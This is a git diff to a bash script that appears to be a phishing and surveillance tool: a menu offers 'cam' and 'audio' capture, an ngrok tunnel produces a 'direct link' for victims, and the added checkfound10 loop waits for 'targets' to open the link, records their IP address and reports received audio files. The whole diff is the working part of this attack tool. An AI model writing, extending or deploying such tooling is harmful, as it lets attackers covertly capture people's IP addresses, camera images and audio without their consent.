@@ -1,5 +1,3 @@
-
-
 trap 'printf "\n";stop;exit 1' 2
 menu() {
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m cam\e[0m      \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m audio\e[0m\n"
@@ -62,6 +60,32 @@ printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio file received!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
+
+done 
+
+}
+
+checkfound10() {
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+rm -rf ip.txt
+
+fi
+
+sleep 0.12
+
+if [[ -e "Log.log" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio file received!\e[0m\n"
+rm -rf Log.log
+fi
+sleep 0.12
 
 done 
 
@@ -269,7 +293,7 @@ link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok1
-checkfound5
+checkfound10
 
 }
 
